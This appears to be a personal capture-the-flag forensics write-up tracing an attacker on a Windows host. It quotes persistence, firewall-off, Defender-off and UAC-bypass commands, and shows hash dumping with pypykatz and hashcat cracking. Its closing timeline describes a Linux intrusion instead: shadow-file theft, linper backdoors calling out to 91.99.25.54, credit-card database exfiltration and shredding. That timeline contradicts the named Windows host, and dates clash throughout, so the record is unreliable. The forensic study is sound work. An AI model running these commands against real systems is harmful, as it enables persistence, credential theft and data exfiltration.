
**Previously in Prison Break**

- **When did the attacker access and read a txt file, which was probably the output of one of the tools they brought, due to the naming convention of the file?**
    *2025-08-20 10:08:06*
- The attacker created a persistence mechanism on the workstation. When was the persistence setup?
	*2025-08-20 10:13:57*

- When did the malicious RMM session end?
	*2025-08-20 10:14:27*

Parsing the disk image using Cape with the module `EZPasrer`

![[Pasted image 20260521020234.png]]

What was the first (non cd) command executed by the attacker on the host?
Last time the attacker moved laterally from the machine central cogwork to Heise-9
So we will hunt first the attacker logon event to correlate time because the last recorded time is 	*2025-08-20 10:14:27*

We search for remote successful logins of the  user Werni,  from the machine 10.129.242.110

`To Detail`


![[Pasted image 20260521033427.png]]

We notice that the authentification package was NTLM `Weak protocol` so teh attacker use tools that generate NTLM 


First Login of the user Werni on `2025-08-15 21:24:30`

Last Login was on  `2025-08-15 22:50`



searching FOR 4688 event id logs around the time of 2025-08-24 22:50
We find a proess called `WmiPrvSE.exe` ; some web searches explaint that WMi can cause CPU spikes.

Filtering for Parent Process = `WmiPrvSE.exe`
We find multiple suspicious commands that we will analyze meticulously


Analysing the cmd.exe process spawned under `WmiPrvSE.exe`

We isolate persistence commands


around 2025-08-24 23:00:15  to  2025-08-24 23:08:15

C:\Windows\System32\cmd.exe cmd.exe /Q /c cmd /C ""echo 10.129.242.110 NapoleonsBlackPearl.htb &gt;&gt; C:\Windows\System32\drivers\etc\hosts"" 
1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1",



"C:\Windows\System32\cmd.exe cmd.exe /Q /c schtasks /create /tn ""SysHelper Update"" /tr ""powershell -ExecutionPolicy Bypass -WindowStyle Hidden 
-File C:\Users\Werni\Appdata\Local\JM.ps1"" /sc minute /mo 2 /ru SYSTEM /f 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1"


C:\Windows\System32\cmd.exe cmd.exe /Q /c netsh advfirewall set allprofiles state off 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1



C:\Windows\System32\cmd.exe cmd.exe /Q /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc"" 
v Start /t REG_DWORD /d 3 /f 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1",


PS C:\Users\PC\Downloads\Sherlocks\Holmes 3\EnduringEcho\C> Get-ChildItem -Recurse -Filter "JM.*"


    Répertoire : C:\Users\PC\Downloads\Sherlocks\Holmes3\EnduringEcho\C\Users\Werni\AppData\Local

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        21/05/2026     01:15           1225 JM.ps1



The Pwsh script explains that the password is in the format Watson_YYYYMMDDHHMMSS  
the creation time of the user svc_netupd is 2025-08-15 23:05:09 doesnt match the password. 
We can find the claire text password decrypting the ntlm hash derived from the password Watson_20250824hhmmss



![[Pasted image 20260603022102.png]]

*impacket toolkit*
![[Pasted image 20260605035807.png]]


*OR*


*python library to dump hashes*

``` 
(config) PS C:\Users\PC\Downloads\Sherlocks\Holmes 3\EnduringEcho\C\Windows\System32\config> pypykatz registry --sam SAM --security SECURITY --software SOFTWARE SYSTEM
```

We use then use 20250824 (the Year,Month and Day) concatenated with ?d?d?d?d?d? . The tells hashcat to use only digits when brute force the other characters. ?d

![[Pasted image 20260605040023.png]]




> [!Important] Note
Looking back at the original times we see the year, month, day, minutes and seconds were the same. However there is a 7 hour difference between the 2 times. The observed 7-hour difference between the log time and the script execution time can be attributed to daylight saving time (DST). The system is set to the Pacific Time Zone (UTC-08:00), which observes DST. During DST, the time zone shifts to UTC-07:00. In this case, the script was executed during a period when DST was in effect, resulting in a 7-hour difference from the standard time


C:\Users\PC\Downloads\Sherlocks\Holmes 3\EnduringEcho\C\Users\Werni\AppData\Roaming



``` 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
``` 
This command ==disables remote User Account Control (UAC) filtering for local accounts on a Windows machine==. It allows any user logging in over the network (e.g., via WMI or PsExec) with local administrator credentials to access resources with full administrative privileges





C:\Users\PC\Downloads\Sherlocks\Holmes 3\EnduringEcho\C\Users\Administrator\AppData\Roaming


``` 
ipconfig
powershell New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 172.18.6.3 -PrefixLength 24
ipconfig.exe
powershell New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 10.129.233.246 -PrefixLength 24
ipconfig
ncpa.cpl
ipconfig
ping 1.1.1.1
cd C:\Users\
ls
net user Werni Quantum1! /add
ls
net localgroup administrator Werni /add
net localgroup Administrators Werni /add
clear
wmic computersystem where name="%COMPUTERNAME%" call rename name="Heisen-9-WS-6"
ls
cd ..
ls
cd .\Users\
ls
net users
Rename-Conputer -NewName "Heisen-9-WS-6" -Force
Rename-Computer -NewName "Heisen-9-WS-6" -Force
net users
ls
net user felamos /delete
cd ..
ls
net users
cat .\Werni\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
Enable-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)"
Enable-NetFirewallRule -DisplayGroup "Remote Event Log Management"
Enable-NetFirewallRule -DisplayGroup "Remote Service Management"
auditpol /set /subcategory:"Process Creation" /success:enable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
Set-MpPreference -DisableRealtimeMonitoring $true
Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled


``` 

the administartor enable capturing commandline in winevent logs 

``` 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
``` 


netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22










## Timeline Events



| Time            | Event                                                                                                                                              | Evidence                                                                                                                        |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **10:39:28**    | The attacker Sucecssfully logged in using the credentials from the exfiltrated file  to `Heisen-9-WS-6` from `10.129.242.110`                      | TCP stream fragments `.131 → .136` containing `USER -f root` payload; resulting shell on `pts/1` with env `DISPLAY=kali:0.0`    |
| ~10:39–10:40    | Initial recon: `id`, `ps`, `cd /root; ls -la`                                                                                                      | Stream                                                                                                                          |
| ~10:42          |                                                                                                                                                    | New `/etc/shadow` entry; yescrypt hash; age field 20480 = 2026-01-27                                                            |
| ~10:42          | Credential dump: `cat /etc/shadow`                                                                                                                 | Full shadow file echoed in stream                                                                                               |
| ~10:43          | Filesystem enumeration: `/`, `/media`, `/dev`, `/opt`                                                                                              | `ls -la` output                                                                                                                 |
| ~10:43          | Sensitive file located: `/opt/credit-cards-25-blackfriday.db` (12 288 B, mtime 2026-01-26 14:05)                                                   | Directory listing                                                                                                               |
| **10:44:31–32** | Persistence tool fetched: `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh` to `/tmp`                        | wget output (34 249 B)                                                                                                          |
| ~10:45          | `bash linper.sh --enum-defenses` — Tripwire enumeration (none found)                                                                               | Tool output                                                                                                                     |
| ~10:45–10:46    | `bash linper.sh -i 91.99.25.54 -p 59 --stealth-mode` — multi-method persistence to `91.99.25.54:59` via awk, bash, nc, perl, pwsh, python3, telnet | Tool output: doors written to `/var/spool/cron/crontabs/root`, `/etc/crontab`, `/etc/cron.d/`, `/etc/systemd/`, `/etc/rc.local` |
| ~10:46          | Timestomping of every modified persistence file                                                                                                    | linper output: "Timestomped Door" per file                                                                                      |
| ~10:49          | Exfil staging: `python3 -m http.server 6932` from `/opt`                                                                                           | "Serving HTTP on 0.0.0.0 port 6932"                                                                                             |
| **10:49:52**    | Attacker host `192.168.72.131` reaches listener (`GET /` → 200)                                                                                    | HTTP server access log                                                                                                          |
| **10:49:54**    | **Exfiltration:** `192.168.72.131 — GET /credit-cards-25-blackfriday.db → 200`                                                                     | HTTP server access log                                                                                                          |
| ~10:50          | HTTP server stopped (`Ctrl+C`)                                                                                                                     | Stream                                                                                                                          |
| ~10:53          | Anti-forensics: `shred -u -z -n 4 -- credit-cards-25-blackfriday.db`                                                                               | `ls -la /opt` confirms removal; `/opt` mtime updates to 10:53                                                                   |
| ~10:53          | Session terminated (`exit`)                                                                                                                        | Stream end                                                                                                                      |
##